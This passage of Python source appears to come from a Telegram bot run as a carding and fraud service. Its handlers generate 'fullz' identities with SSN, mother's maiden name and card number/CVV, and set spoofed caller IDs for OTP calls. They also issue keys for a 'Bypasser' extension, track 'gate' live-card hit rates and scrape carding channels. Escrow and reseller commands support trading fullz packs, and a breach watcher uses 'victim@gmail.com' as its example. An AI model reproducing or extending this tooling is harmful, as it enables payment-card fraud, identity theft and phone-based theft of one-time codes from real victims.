    text = (
        f"🛒 <b>Your Purchases</b> ({data['total']} total)\n\n"
        + "\n\n".join(lines)
    )
    if len(text) > 4000:
        text = text[:4000] + "\n\n..."
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


def _mdb():
    """Return a synchronous _execute_with_retry callable from database module."""
    from modules.database import _execute_with_retry as _er
    return _er


def _ensure_marketplace_table():
    """Create marketplace_listings table if not exists."""
    _mdb()("""
        CREATE TABLE IF NOT EXISTS marketplace_listings (
            listing_id TEXT PRIMARY KEY,
            seller_id INTEGER NOT NULL,
            buyer_id INTEGER,
            price INTEGER NOT NULL,
            description TEXT,
            status TEXT DEFAULT 'active',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)


async def cmd_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate a synthetic billing address (/address [country])."""
    from modules.fake_identity import generate_holder_info
    country = " ".join(context.args) if context.args else ""
    info = generate_holder_info(country_name=country)
    await _reply_with_gif(update.message, "welcome",
        ae("🏠 <b>Billing Address</b>") + "\n\n"
        f"👤 <b>Name:</b> <code>{info['name']}</code>\n"
        f"📧 <b>Email:</b> <code>{info['email']}</code>\n"
        f"📞 <b>Phone:</b> <code>{info['phone']}</code>\n"
        f"📍 <b>Address:</b> <code>{info['address']}</code>\n"
        f"🏙 <b>City:</b> <code>{info['city']}</code>\n"
        f"🗺 <b>State:</b> <code>{info['state']}</code>\n"
        f"📮 <b>Zip:</b> <code>{info['zip']}</code>\n"
        f"🌍 <b>Country:</b> <code>{info['country_code']}</code>"
    )


async def cmd_fullz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate a complete synthetic fullz identity (/fullz [country])."""
    @require_approval
    async def _inner(update, context):
        country = " ".join(context.args) if context.args else ""
        info = generate_fullz(country_name=country)
        await _reply_with_gif(update.message, "welcome",
            ae("🗂 <b>FULLZ — Full Synthetic Identity</b>") + "\n\n"
            f"👤 <b>Name:</b> <code>{info['name']}</code>\n"
            f"🎂 <b>DOB:</b> <code>{info['dob']}</code>\n"
            f"🪪 <b>SSN/ID:</b> <code>{info['ssn']}</code>\n"
            f"🚗 <b>DL:</b> <code>{info['dl']}</code>\n"
            f"👩 <b>Mother's Maiden:</b> <code>{info['mothers_maiden']}</code>\n\n"
            f"📧 <b>Email:</b> <code>{info['email']}</code>\n"
            f"📞 <b>Phone:</b> <code>{info['phone']}</code>\n"
            f"📍 <b>Address:</b> <code>{info['address']}</code>\n"
            f"🏙 <b>City:</b> <code>{info['city']}</code>\n"
            f"🗺 <b>State:</b> <code>{info['state']}</code>\n"
            f"📮 <b>Zip:</b> <code>{info['zip']}</code>\n"
            f"🌍 <b>Country:</b> <code>{info['country_code']}</code>\n\n"
            f"💳 <b>CC:</b> <code>{info['cc']}</code>\n"
            f"📅 <b>Exp:</b> <code>{info['cc_exp']}</code>\n"
            f"🔐 <b>CVV:</b> <code>{info['cc_cvv']}</code>"
        )
    await _inner(update, context)


async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's credit balance (/balance)."""
    user_id = update.effective_user.id
    bal = get_balance(user_id)
    hist = get_transaction_history(user_id, limit=5)
    lines = []
    for row in hist:
        sign = "+" if row.get('amount', 0) > 0 else ""
        lines.append(f"  {sign}{row.get('amount', 0)} — {row.get('description', row.get('reason', ''))[:40]}")
    hist_text = "\n".join(lines) if lines else "  No recent transactions"
    await _reply_with_gif(update.message, "premium",
        ae("💰 <b>Credit Balance</b>") + "\n\n"
        f"💵 Balance: <b>{bal}</b> credits\n\n"
        f"📋 <b>Recent Transactions:</b>\n{hist_text}"
    )


async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem a credit voucher (/redeem <code>)."""
    if not context.args:
        await update.message.reply_text(
            "🎟 <b>Redeem Voucher</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/redeem &lt;code&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>code</code> — Your voucher code (case-sensitive)\n\n"
            "<b>Example:</b>\n"
            "<code>/redeem SAVE100</code>\n\n"
            "💡 Get voucher codes from the owner or marketplace.",
            parse_mode=ParseMode.HTML,
        )
        return
    code = context.args[0].strip()
    user_id = update.effective_user.id
    result = redeem_voucher(user_id, code)
    ok = result.get('success', False) if isinstance(result, dict) else False
    credits_added = result.get('credits', 0) if isinstance(result, dict) else 0
    err_msg = result.get('message', 'Failed') if isinstance(result, dict) else str(result)
    if ok:
        if credits_added:
            add_credits(user_id, credits_added, tx_type="voucher", description=f"Voucher: {code}")
        bal = get_balance(user_id)
        await _reply_with_gif(update.message, "success",
            ae("✅ <b>Voucher Redeemed!</b>") + "\n\n"
            f"🎁 Credits added: <b>+{credits_added}</b>\n"
            f"💰 New balance: <b>{bal}</b>"
        )
    else:
        await _reply_with_gif(update.message, "failed", f"❌ {err_msg}")


async def cmd_gift(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gift credits to another user (/gift @username amount or /gift user_id amount)."""
    if len(context.args) < 2:
        await update.message.reply_text(
            "💸 <b>Gift Credits</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/gift &lt;user_id&gt; &lt;amount&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>user_id</code> — Telegram user ID of the recipient\n"
            "• <code>amount</code> — Number of credits to send (must be positive)\n\n"
            "<b>Examples:</b>\n"
            "<code>/gift 123456789 100</code>\n"
            "<code>/gift 987654321 50</code>\n\n"
            "💡 Credits are deducted from your balance instantly.\n"
            "Use <code>/balance</code> to check how many you have first.",
            parse_mode=ParseMode.HTML,
        )
        return
    target_raw = context.args[0].lstrip("@")
    try:
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Amount must be a number.", parse_mode=ParseMode.HTML)
        return
    if amount <= 0:
        await update.message.reply_text("❌ Amount must be positive.", parse_mode=ParseMode.HTML)
        return

    sender_id = update.effective_user.id
    try:
        target_id = int(target_raw)
    except ValueError:
        await update.message.reply_text(
            "❌ Please provide the numeric user ID.",
            parse_mode=ParseMode.HTML,
        )
        return

    sender_bal = get_balance(sender_id)
    if sender_bal < amount:
        await update.message.reply_text(
            f"❌ Insufficient credits. You have <b>{sender_bal}</b> credits.",
            parse_mode=ParseMode.HTML,
        )
        return

    ok, msg = transfer_credits(sender_id, target_id, amount)
    if ok:
        await _reply_with_gif(update.message, "success",
            ae("🎁 <b>Gift Sent!</b>") + "\n\n"
            f"💸 Sent <b>{amount}</b> credits → <code>{target_id}</code>"
        )
    else:
        await _reply_with_gif(update.message, "failed", f"❌ {msg}")


async def cmd_voucher(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: create or list credit vouchers (/voucher create <credits> [max_uses] | /voucher list)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    sub = context.args[0].lower() if context.args else ""
    if sub == "create":
        try:
            credits_val = int(context.args[1]) if len(context.args) > 1 else 100
            max_uses = int(context.args[2]) if len(context.args) > 2 else 1
        except (ValueError, IndexError):
            await update.message.reply_text(
                "🎟 <b>Create Voucher</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/voucher create &lt;credits&gt; [max_uses]</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>credits</code> — How many credits the voucher grants\n"
                "• <code>max_uses</code> — How many times it can be redeemed (default: 1)\n\n"
                "<b>Examples:</b>\n"
                "<code>/voucher create 100</code>  ← single-use\n"
                "<code>/voucher create 50 10</code>  ← 10-use code",
                parse_mode=ParseMode.HTML,
            )
            return
        code = generate_credit_voucher(credits_val, max_uses=max_uses)
        await _reply_with_gif(update.message, "success",
            ae("🎟 <b>Voucher Created</b>") + "\n\n"
            f"🔑 Code: <code>{code}</code>\n"
            f"💰 Credits: <b>{credits_val}</b>\n"
            f"🔄 Max Uses: <b>{max_uses}</b>"
        )
    elif sub == "list":
        vouchers = get_all_vouchers()
        if not vouchers:
            await update.message.reply_text("No vouchers found.", parse_mode=ParseMode.HTML)
            return
        lines = []
        for v in vouchers[:20]:
            uses = v.get('uses', 0)
            max_uses = v.get('max_uses', 1)
            uses_left = max_uses - uses
            active = "✅" if v.get('active', True) else "❌"
            lines.append(
                f"• <code>{v['code']}</code> — {v.get('credits', 0)} cr | "
                f"{uses}/{max_uses} used | {active}"
            )
        await update.message.reply_text(
            ae("🎟 <b>Vouchers</b>") + "\n\n" + "\n".join(lines),
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            "🎟 <b>Voucher Manager</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/voucher create &lt;credits&gt; [max_uses]</code>\n"
            "<code>/voucher list</code>\n\n"
            "<b>Subcommands:</b>\n"
            "• <code>create</code> — Generate a new redeemable voucher code\n"
            "• <code>list</code> — Show all vouchers with usage stats\n\n"
            "<b>Examples:</b>\n"
            "<code>/voucher create 100</code>  ← single-use, 100 credits\n"
            "<code>/voucher create 50 5</code>  ← 5 uses, 50 credits each\n"
            "<code>/voucher list</code>\n\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )


async def cmd_addcredits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: add credits to user (/addcredits user_id amount)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "💰 <b>Add Credits</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/addcredits &lt;user_id&gt; &lt;amount&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>user_id</code> — Telegram user ID to credit\n"
            "• <code>amount</code> — Number of credits to add\n\n"
            "<b>Example:</b>\n"
            "<code>/addcredits 123456789 500</code>\n\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    try:
        target = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid arguments.", parse_mode=ParseMode.HTML)
        return
    add_credits(target, amount, tx_type="add", description="Admin grant")
    await _reply_with_gif(update.message, "success",
        f"✅ Added <b>{amount}</b> credits to <code>{target}</code>."
    )


async def cmd_setcallerid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set custom caller ID for OTP calls (/setcallerid +12025551234)."""
    @require_approval
    async def _inner(update, context):
        from modules.twilio_call import set_user_caller_id
        if not context.args:
            await update.message.reply_text(
                "📞 <b>Set Caller ID</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/setcallerid &lt;number&gt;</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>number</code> — Phone number with country code (e.g. +12025551234)\n"
                "  Use <code>off</code> to reset to the default Twilio number\n\n"
                "<b>Examples:</b>\n"
                "<code>/setcallerid +12025551234</code>  ← spoof this number\n"
                "<code>/setcallerid off</code>  ← revert to default\n\n"
                "⚠️ Number must be verified in your Twilio account to work.\n"
                "Check your saved ID with <code>/callerid</code>.\n"
                "Use <code>/setcallerid off</code> to clear.",
                parse_mode=ParseMode.HTML,
            )
            return
        number = context.args[0].strip()
        user_id = update.effective_user.id
        if number.lower() == "off":
            set_user_caller_id(str(user_id), "")
            await _reply_with_gif(update.message, "success", "✅ Caller ID cleared. Using default Twilio number.")
        else:
            set_user_caller_id(str(user_id), number)
            await _reply_with_gif(update.message, "success",
                ae("📞 <b>Caller ID Set</b>") + f"\n\n"
                f"Your calls will appear from: <code>{number}</code>\n"
                "⚠️ Number must be a verified Twilio caller ID or Twilio phone number."
            )
    await _inner(update, context)


async def cmd_callerid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current caller ID setting (/callerid)."""
    from modules.twilio_call import get_user_caller_id
    user_id = update.effective_user.id
    cid = get_user_caller_id(str(user_id))
    if cid:
        msg = f"📞 Your caller ID: <code>{cid}</code>"
    else:
        msg = "📞 Using default Twilio number."
    await _reply_with_gif(update.message, "welcome", msg)


async def cmd_extkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate an Onichan Bypasser Chrome extension activation key (/extkey)."""
    user = update.effective_user
    from modules.database import create_extension_key
    try:
        key = create_extension_key(user.id)
        await _reply_with_gif(update.message, "success",
            ae("🔑 <b>Onichan Bypasser — Extension Key</b>") + "\n\n"
            f"Your activation key:\n<code>{key}</code>\n\n"
            "📌 <b>How to use:</b>\n"
            "1. Install the Onichan Bypasser Chrome extension\n"
            "2. Open the extension and paste this key\n"
            "3. Click <b>Unlock</b> to activate all features\n\n"
            "⚠️ Each user gets one active key — generating a new one revokes the old one.\n"
            "🔒 Keep this key private."
        )
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Failed to generate key: {str(e)[:80]}"), parse_mode=ParseMode.HTML)


async def cmd_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show gate hit rate analytics (/analytics)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    stats = get_gate_stats()
    if not stats:
        await update.message.reply_text("No analytics data yet. Run some checks first.", parse_mode=ParseMode.HTML)
        return
    lines = []
    for s in stats[:15]:
        gate = s.get('gate', '?')
        total = s.get('total', 0)
        live = s.get('live', 0)
        rate = s.get('live_pct', 0.0)
        lines.append(f"• <b>{gate}</b>: {live}/{total} ({rate:.1f}% live)")
    await _reply_with_gif(update.message, "admin",
        ae("📊 <b>Gate Analytics (24h)</b>") + "\n\n" + "\n".join(lines)
    )


async def cmd_gatetest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: ping all gates for health status (/gatetest)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    msg = await update.message.reply_text("🔎 Testing all gates...", parse_mode=ParseMode.HTML)
    results = run_gate_health_check()
    lines = []
    for r in sorted(results, key=lambda x: x.get('gate', '')):
        icon = "✅" if r.get('up') else "❌"
        latency = r.get('latency_ms', 0)
        lines.append(f"{icon} <b>{r.get('gate', '?')}</b> — {latency}ms")
    result_text = ae("🏥 <b>Gate Health Report</b>") + "\n\n" + "\n".join(lines)
    try: await msg.delete()
    except Exception: pass
    await _reply_with_gif(update.message, "admin", result_text)


async def cmd_find(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: find user by ID or username (/find <user_id|@username>)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>Find Listing</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/find &lt;keyword&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>keyword</code> — Search term (matches title or description)\n\n"
            "<b>Examples:</b>\n"
            "<code>/find fullz usa</code>\n"
            "<code>/find amazon account</code>\n\n"
            "💡 Searches all active marketplace listings.",
            parse_mode=ParseMode.HTML,
        )
        return
    query_val = context.args[0].lstrip("@")
    try:
        target_id = int(query_val)
    except ValueError:
        await update.message.reply_text("❌ Provide numeric user ID.", parse_mode=ParseMode.HTML)
        return

    try:
        chat = await context.bot.get_chat(target_id)
        username = f"@{chat.username}" if chat.username else "none"
        name = chat.full_name or "Unknown"
        is_prem = is_user_premium_sync(target_id)
        bal = get_balance(target_id)
        await _reply_with_gif(update.message, "welcome",
            ae("🔍 <b>User Found</b>") + "\n\n"
            f"🆔 ID: <code>{target_id}</code>\n"
            f"👤 Name: {html_escape(name)}\n"
            f"🔗 Username: {username}\n"
            f"⭐ Premium: {'Yes' if is_prem else 'No'}\n"
            f"💰 Credits: {bal}"
        )
    except Exception as e:
        await _reply_with_gif(update.message, "failed", f"❌ Could not find user: {html_escape(str(e))}")


async def cmd_restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: restart the bot process (/restart)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    await update.message.reply_text("🔄 Restarting bot...", parse_mode=ParseMode.HTML)
    import os, sys
    os.execv(sys.executable, [sys.executable] + sys.argv)


async def cmd_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show reseller dashboard or add/remove resellers (/reseller)."""
    user_id = update.effective_user.id
    if is_owner(user_id):
        sub = context.args[0].lower() if context.args else "list"
        if sub == "add" and len(context.args) >= 3:
            try:
                rid = int(context.args[1])
                limit = int(context.args[2])
                commission = int(context.args[3]) if len(context.args) > 3 else 10
            except ValueError:
                await update.message.reply_text(
                    "👥 <b>Add Reseller</b>\n\n"
                    "<b>Usage:</b>\n"
                    "<code>/reseller add &lt;user_id&gt; &lt;client_limit&gt; [commission%]</code>\n\n"
                    "<b>Arguments:</b>\n"
                    "• <code>user_id</code> — Telegram ID of the reseller\n"
                    "• <code>client_limit</code> — Max clients they can manage\n"
                    "• <code>commission%</code> — Their commission rate (default: 10%)\n\n"
                    "<b>Example:</b>\n"
                    "<code>/reseller add 123456789 50 15</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
            add_reseller(rid, username=f"user_{rid}", credit_limit=limit, commission_pct=commission, created_by=user_id)
            await _reply_with_gif(update.message, "success", f"✅ Added reseller <code>{rid}</code> | Limit: {limit} | Commission: {commission}%")
        elif sub == "remove" and len(context.args) >= 2:
            try:
                rid = int(context.args[1])
            except ValueError:
                await update.message.reply_text(
                    "👥 <b>Remove Reseller</b>\n\n"
                    "<b>Usage:</b>\n"
                    "<code>/reseller remove &lt;user_id&gt;</code>\n\n"
                    "<b>Example:</b>\n"
                    "<code>/reseller remove 123456789</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
            remove_reseller(rid)
            await update.message.reply_text(f"✅ Removed reseller <code>{rid}</code>", parse_mode=ParseMode.HTML)
        elif sub == "list":
            all_r = get_all_resellers()
            if not all_r:
                await update.message.reply_text("No resellers found.", parse_mode=ParseMode.HTML)
                return
            lines = [f"• <code>{r.get('user_id','?')}</code> @{r.get('username','?')} — {r.get('clients',0)} clients/{r.get('limit',0)} limit | {r.get('commission',0)}% commission" for r in all_r]
            await update.message.reply_text(ae("👥 <b>Resellers</b>") + "\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(
                "👥 <b>Reseller System</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/reseller</code>  ← your dashboard\n"
                "<code>/reseller list</code>  ← all resellers (owner)\n"
                "<code>/reseller add &lt;uid&gt; &lt;limit&gt; [commission%]</code>  ← add\n"
                "<code>/reseller remove &lt;uid&gt;</code>  ← remove\n\n"
                "<b>Dashboard shows:</b>\n"
                "• Your client list and limits\n"
                "• Commission rate and balance\n\n"
                "Use <code>/addclient &lt;uid&gt; &lt;limit&gt;</code> to add clients under you.\n"
                "👑 Admin commands require owner access.\n"
                "<code>/reseller list</code>\n"
                "<code>/reseller add &lt;id&gt; &lt;limit&gt; [commission%]</code>\n"
                "<code>/reseller remove &lt;id&gt;</code>",
                parse_mode=ParseMode.HTML,
            )
    else:
        info = get_reseller_info(user_id)
        if not info:
            await update.message.reply_text("❌ You are not a reseller.", parse_mode=ParseMode.HTML)
            return
        clients = get_clients(user_id)
        await _reply_with_gif(update.message, "admin",
            ae("🏪 <b>Reseller Dashboard</b>") + "\n\n"
            f"🆔 Your ID: <code>{user_id}</code>\n"
            f"👥 Clients: <b>{len(clients)}</b> / {info.get('credit_limit', 0)}\n"
            f"💰 Commission: <b>{info.get('commission_pct', 0)}%</b>\n\n"
            "Use <code>/addclient &lt;user_id&gt; &lt;credit_limit&gt;</code> to add clients."
        )


async def cmd_addclient(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reseller: add a client (/addclient user_id credit_limit)."""
    user_id = update.effective_user.id
    reseller = get_reseller_info(user_id)
    if not reseller and not is_owner(user_id):
        await update.message.reply_text("❌ Only resellers can add clients.", parse_mode=ParseMode.HTML)
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "👤 <b>Add Client</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/addclient &lt;user_id&gt; &lt;credit_limit&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>user_id</code> — Telegram ID of the client to add\n"
            "• <code>credit_limit</code> — Max credits this client can use\n\n"
            "<b>Example:</b>\n"
            "<code>/addclient 123456789 200</code>\n\n"
            "💡 You must be a registered reseller to use this.",
            parse_mode=ParseMode.HTML,
        )
        return
    try:
        client_id = int(context.args[0])
        credit_limit = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid arguments.", parse_mode=ParseMode.HTML)
        return
    ok = add_client(user_id, client_id, credit_limit)
    if ok:
        await _reply_with_gif(update.message, "success", f"✅ Client <code>{client_id}</code> added with {credit_limit} credit limit.")
    else:
        await _reply_with_gif(update.message, "failed", "❌ Failed to add client. Check your client limit.")


async def cmd_escrow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Escrow: create or manage escrow deals (/escrow create <amount> <description>)."""
    user_id = update.effective_user.id
    sub = context.args[0].lower() if context.args else "menu"

    if sub == "create":
        if len(context.args) < 3:
            await update.message.reply_text(
                "Usage: <code>/escrow create &lt;amount&gt; &lt;description&gt;</code>",
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            amount = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Amount must be a number.", parse_mode=ParseMode.HTML)
            return
        desc = " ".join(context.args[2:])
        result = create_deal(user_id, amount, desc)
        if not result or "error" in result:
            err = result.get("error", "Unknown error") if result else "Database error"
            await update.message.reply_text(f"❌ {html_escape(err)}", parse_mode=ParseMode.HTML)
            return
        deal_id = result["deal_id"]
        await update.message.reply_text(
            ae("🤝 <b>Escrow Deal Created</b>") + "\n\n"
            f"🆔 Deal ID: <code>{deal_id}</code>\n"
            f"💰 Amount: <b>{amount}</b> credits (locked)\n"
            f"📋 Description: {html_escape(desc)}\n\n"
            "Share the deal ID with the seller. They use:\n"
            f"<code>/escrow join {deal_id}</code>",
            parse_mode=ParseMode.HTML,
        )

    elif sub == "join":
        if len(context.args) < 2:
            await update.message.reply_text(
                "🤝 <b>Join Escrow Deal</b>\n\n"
                "<b>Usage:</b> <code>/escrow join &lt;deal_id&gt;</code>\n\n"
                "<b>Example:</b> <code>/escrow join 42</code>\n\n"
                "The buyer shares the deal ID with you.",
                parse_mode=ParseMode.HTML,
            )
            return
        deal_id = context.args[1]
        ok, msg_txt = join_deal(deal_id, user_id)
        await update.message.reply_text(
            ("✅ " if ok else "❌ ") + html_escape(msg_txt),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "confirm":
        if len(context.args) < 2:
            await update.message.reply_text(
                "✅ <b>Confirm Escrow Deal</b>\n\n"
                "<b>Usage:</b> <code>/escrow confirm &lt;deal_id&gt;</code>\n\n"
                "<b>Example:</b> <code>/escrow confirm 42</code>\n\n"
                "⚠️ Only confirm when you have received the goods.\n"
                "This releases the locked credits to the seller.",
                parse_mode=ParseMode.HTML,
            )
            return
        deal_id = context.args[1]
        ok, msg_txt = confirm_deal(deal_id, user_id)
        await update.message.reply_text(
            ("✅ " if ok else "❌ ") + html_escape(msg_txt),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "dispute":
        if len(context.args) < 2:
            await update.message.reply_text(
                "⚠️ <b>Open Escrow Dispute</b>\n\n"
                "<b>Usage:</b> <code>/escrow dispute &lt;deal_id&gt;</code>\n\n"
                "<b>Example:</b> <code>/escrow dispute 42</code>\n\n"
                "The owner will review and resolve the dispute.",
                parse_mode=ParseMode.HTML,
            )
            return
        deal_id = context.args[1]
        ok, msg_txt = dispute_deal(deal_id, user_id)
        await update.message.reply_text(
            ("⚠️ " if ok else "❌ ") + html_escape(msg_txt),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "resolve" and is_owner(user_id):
        if len(context.args) < 3:
            await update.message.reply_text(
                "⚖️ <b>Resolve Escrow Dispute</b>\n\n"
                "<b>Usage:</b> <code>/escrow resolve &lt;deal_id&gt; &lt;buyer|seller&gt;</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>deal_id</code> — The deal ID in dispute\n"
                "• <code>buyer|seller</code> — Who wins the dispute\n\n"
                "<b>Example:</b> <code>/escrow resolve 42 seller</code>\n\n"
                "👑 Owner only.",
                parse_mode=ParseMode.HTML,
            )
            return
        deal_id = context.args[1]
        winner = context.args[2].lower()
        if winner not in ("seller", "buyer"):
            await update.message.reply_text("❌ Winner must be 'seller' or 'buyer'.", parse_mode=ParseMode.HTML)
            return
        ok, msg_txt = admin_resolve_deal(deal_id, winner)
        await update.message.reply_text(
            ("✅ " if ok else "❌ ") + html_escape(msg_txt),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "list":
        deals = get_user_deals(user_id)
        if not deals:
            await update.message.reply_text("No escrow deals found.", parse_mode=ParseMode.HTML)
            return
        lines = [
            f"• <code>{d.get('id','?')}</code> — {d.get('credits', 0)} cr | {d.get('status', '?')} | {html_escape(str(d.get('desc', ''))[:40])}"
            for d in deals[:10]
        ]
        await update.message.reply_text(
            ae("🤝 <b>Your Escrow Deals</b>") + "\n\n" + "\n".join(lines),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "disputes" and is_owner(user_id):
        deals = get_disputed_deals()
        if not deals:
            await update.message.reply_text("No disputed deals.", parse_mode=ParseMode.HTML)
            return
        lines = [
            f"• <code>{d.get('id','?')}</code> — {d.get('credits', 0)} cr | {html_escape(str(d.get('desc', ''))[:40])}"
            for d in deals[:10]
        ]
        await update.message.reply_text(
            ae("⚠️ <b>Disputed Deals</b>") + "\n\n" + "\n".join(lines),
            parse_mode=ParseMode.HTML,
        )

    else:
        await update.message.reply_text(
            "🤝 <b>Escrow — Secure Credit Trades</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/escrow create &lt;amount&gt; &lt;description&gt;</code>\n"
            "<code>/escrow join &lt;deal_id&gt;</code>\n"
            "<code>/escrow confirm &lt;deal_id&gt;</code>\n"
            "<code>/escrow dispute &lt;deal_id&gt;</code>\n"
            "<code>/escrow list</code>\n"
            "<code>/escrow resolve &lt;deal_id&gt; buyer|seller</code>  ← owner\n\n"
            "<b>How it works:</b>\n"
            "1️⃣ Buyer creates a deal — credits are locked\n"
            "2️⃣ Seller joins the deal with the deal ID\n"
            "3️⃣ Buyer confirms delivery — credits released\n"
            "4️⃣ Either party can open a dispute if needed\n\n"
            "<b>Example:</b>\n"
            "<code>/escrow create 500 Fullz pack x10</code>",
            parse_mode=ParseMode.HTML,
        )


async def cmd_hibpwatch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """HIBP breach watcher: watch/unwatch emails (/hibpwatch add|remove|list <email>)."""
    @require_approval
    async def _inner(update, context):
        user_id = update.effective_user.id
        sub = context.args[0].lower() if context.args else "list"

        if sub == "add":
            if len(context.args) < 2:
                await update.message.reply_text(
                    "👁 <b>Watch Email for Breaches</b>\n\n"
                    "<b>Usage:</b> <code>/hibpwatch add &lt;email&gt;</code>\n\n"
                    "<b>Example:</b> <code>/hibpwatch add victim@gmail.com</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
            email = context.args[1]
            result = add_watch(user_id, email)
            if isinstance(result, tuple):
                ok, msg_txt = result
            else:
                ok, msg_txt = bool(result), "Added" if result else "Failed"
            await update.message.reply_text(("✅ " if ok else "❌ ") + html_escape(msg_txt), parse_mode=ParseMode.HTML)

        elif sub == "remove":
            if len(context.args) < 2:
                await update.message.reply_text(
                    "👁 <b>Remove Email Watch</b>\n\n"
                    "<b>Usage:</b> <code>/hibpwatch remove &lt;email&gt;</code>\n\n"
                    "<b>Example:</b> <code>/hibpwatch remove victim@gmail.com</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
            email = context.args[1]
            ok = remove_watch(user_id, email)
            await update.message.reply_text("✅ Watch removed." if ok else "❌ Not found.", parse_mode=ParseMode.HTML)

        elif sub == "list":
            watches = get_user_watches(user_id)
            if not watches:
                await update.message.reply_text("You have no email watches. Use <code>/hibpwatch add &lt;email&gt;</code>", parse_mode=ParseMode.HTML)
                return
            lines = [f"• <code>{w.get('email', w) if isinstance(w, dict) else w}</code>" for w in watches]
            await update.message.reply_text(
                ae("👁 <b>HIBP Email Watches</b>") + "\n\n" + "\n".join(lines),
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                "👁 <b>HIBP Breach Watcher</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/hibpwatch add &lt;email&gt;</code>\n"
                "<code>/hibpwatch remove &lt;email&gt;</code>\n"
                "<code>/hibpwatch list</code>\n\n"
                "<b>Subcommands:</b>\n"
                "• <code>add</code> — Start watching an email for breaches\n"
                "• <code>remove</code> — Stop watching an email\n"
                "• <code>list</code> — Show all your watched emails\n\n"
                "<b>Examples:</b>\n"
                "<code>/hibpwatch add victim@gmail.com</code>\n"
                "<code>/hibpwatch remove victim@gmail.com</code>\n\n"
                "⚠️ Max 5 emails per user.\n"
                "You will be alerted automatically when a new breach is detected.",
                parse_mode=ParseMode.HTML,
            )
    await _inner(update, context)


async def cmd_scraper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Channel card scraper: add/remove/list channels (/scraper add|remove|list|stats)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    sub = context.args[0].lower() if context.args else "list"

    admin_id = update.effective_user.id
    if sub == "add":
        if len(context.args) < 2:
            await update.message.reply_text(
                "📡 <b>Add Scraper Channel</b>\n\n"
                "<b>Usage:</b> <code>/scraper add @channel</code>\n\n"
                "<b>Example:</b> <code>/scraper add @cardingchannel</code>\n\n"
                "⚠️ The bot must be an admin in the channel to see messages.",
                parse_mode=ParseMode.HTML,
            )
            return
        channel = context.args[1].lstrip("@")
